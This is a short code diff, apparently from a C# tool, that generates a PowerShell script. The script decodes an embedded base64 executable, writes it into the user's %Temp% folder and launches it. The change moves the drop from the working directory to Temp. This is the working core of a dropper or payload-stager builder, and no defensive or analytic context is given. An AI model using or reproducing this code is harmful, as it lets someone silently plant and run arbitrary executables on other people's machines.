@@ -20,12 +20,18 @@
         {
             try
             {
-                var ps1Content = $@"$payload = @""
+                var ps1Content = $@"$payload = @"" 
 {base64Content}
 ""@
+
 $bytes = [System.Convert]::FromBase64String($payload)
-[System.IO.File]::WriteAllBytes('{outFile.Replace(".ps1", "")}.exe', $bytes)
-Start-Process '{outFile.Replace(".ps1", "")}.exe'";
+
+$exeName = '{outFile.Replace(".ps1", "")}.exe'
+$exePath = Join-Path $env:Temp $exeName
+
+[System.IO.File]::WriteAllBytes($exePath, $bytes)
+
+Start-Process -FilePath $exePath";
 
                 var outFileName = $"{outFile}".Replace(".ps1", "");
                 File.WriteAllText($"{outFileName}.ps1", ps1Content);
